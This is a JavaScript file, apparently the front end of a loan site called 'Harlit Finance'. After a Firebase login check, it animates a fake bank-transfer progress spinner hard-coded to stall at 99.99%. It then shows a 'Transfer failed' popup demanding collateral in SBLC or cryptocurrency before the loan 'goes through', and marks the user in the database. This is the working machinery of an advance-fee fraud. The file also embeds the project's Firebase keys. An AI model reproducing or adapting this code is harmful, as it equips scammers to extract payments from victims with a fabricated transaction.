window.onload = function() {
    const firebaseConfig = {
        apiKey: "AIzaSyAdpKwXX_dtdjaQ7ia0OC7VxQNw-_nI_iY",
        authDomain: "arlitfinance.firebaseapp.com",
        databaseURL: "https://arlitfinance-default-rtdb.firebaseio.com",
        projectId: "arlitfinance",
        storageBucket: "arlitfinance.appspot.com",
        messagingSenderId: "1012825535505",
        appId: "1:1012825535505:web:767da3656b27c1b994edb0"
          };
          
          firebase.initializeApp(firebaseConfig);
          const database = firebase.database(); 
          document.getElementById('canvasId').style.opacity = "0"
        firebase.auth().onAuthStateChanged(function(user) { 
        if(user){
            var userId = user.uid;
            localStorage.setItem('unserconnect', userId) 
            const userRef = database.ref(`/utilisateurs/${userId}`);
            userRef.once("value")
            .then((snapshot) => {
            if(snapshot.exists()){
            if(snapshot.val().B_U){
                document.getElementById('canvasId').style.opacity = "1"
                ghjklskfdjh()
            }else{
             window.location.href = "myaccount.html"
            }
            } 
          })
        }else{
            window.location.href = "login/emaillogin.html"
            console.log("no userId")
          }
       })
  function ghjklskfdjh(){
    let spinner = document.getElementById("spinner");
    let ctx = spinner.getContext("2d");
    let width = spinner.width;
    let height = spinner.height;
    let degrees = 0;
    let new_degrees = 359.964; // 99.99% of 360 degrees
    let difference = 0;
    let color = "turquoise";
    let bgcolor = "#222";
    let text;
    let animation_loop, redraw_loop;

    // Restaurer la valeur de degrees depuis le localStorage
    if (localStorage.getItem('degreesxvw')) {
        degrees = parseFloat(localStorage.getItem('degreesxvw'));
        console.log("1", degrees)
    }

    function init() {
        ctx.clearRect(0, 0, width, height);

        ctx.beginPath();
        ctx.strokeStyle = bgcolor;
        ctx.lineWidth = 30;
        ctx.arc(width / 2, width / 2, 100, 0, Math.PI * 2, false);
        ctx.stroke();
        let radians = degrees * Math.PI / 180;

        ctx.beginPath();
        ctx.strokeStyle = color;
        ctx.lineWidth = 30;
        ctx.arc(width / 2, height / 2, 100, 0 - 90 * Math.PI / 180, radians - 90 * Math.PI / 180, false);
        ctx.stroke();
        ctx.fillStyle = color;
        ctx.font = "50px arial";
        text = (degrees / 360 * 100).toFixed(2) + "%";
        text_width = ctx.measureText(text).width;
        ctx.fillText(text, width / 2 - text_width / 2, height / 2 + 15);
        //console.log(text)
        if(text === "99.99%"){
            setTimeout(()=>{ 
            document.getElementById('TransferId').style.display = "none"
            document.getElementById('TransferId').innerHTML = `Transfer failed`,
            Swal.fire({
            icon: 'error',
            title: 'Oops...',
            text: `Hi, your transaction is about to go through, please provide collateral (SBLC or virtual cryptos) so that the transaction is effective in your bank account.`,
            cancelButtonText:"Already received",
            confirmButtonText: "Already contact",
            didRender: () => {
                // Personnaliser le bouton cancelButton pour inclure du HTML
                const cancelButton = Swal.getCancelButton();
                cancelButton.innerHTML = `<a href="mailto:info@harlitfinance.com?subject=Loan%20Transfer%20Issue&body=Hello%2C%20Harlit%20Finance%2C%0A%0AI%20am%20contacting%20you%20regarding%20the%20failed%20transfer%20of%20my%20loan%20to%20my%20bank%20account.">Contact Harlit Finance</a>`
            },
            showCancelButton: true,
            allowOutsideClick: false,
            }).then((result)=>{
            if(result.isConfirmed){
            var accesscodexwx = "IAJDGHNLEIFJHEIDJHEQIKAJHJEHH"
            localStorage.setItem('accesscodexwx', accesscodexwx)
            window.location.reload(); 
            }
            })
        },4000)
        const unserconnectId = localStorage.getItem("unserconnect") 
        firebase.database().ref('utilisateurs/' + unserconnectId).update({
            K_U: true,
        }).then(() => {
           
        }).catch((error) => {
            
        });
        }
    }

    function draw() {
        if (typeof animation_loop != undefined) clearInterval(animation_loop);
        difference = new_degrees - degrees;
        animation_loop = setInterval(animate_to, 10000 / difference);
    }

    function animate_to() {
        if (degrees >= new_degrees) {
            clearInterval(animation_loop);
            // Enregistrer la valeur de degrees dans le localStorage
            localStorage.setItem('degreesxvw', degrees);
            console.log("2", degrees)
        } else {
            degrees += 0.036; // Increase degrees by a small fraction to reach exactly 359.964
            init();
        }
    }

    init();
    draw();
  } 
}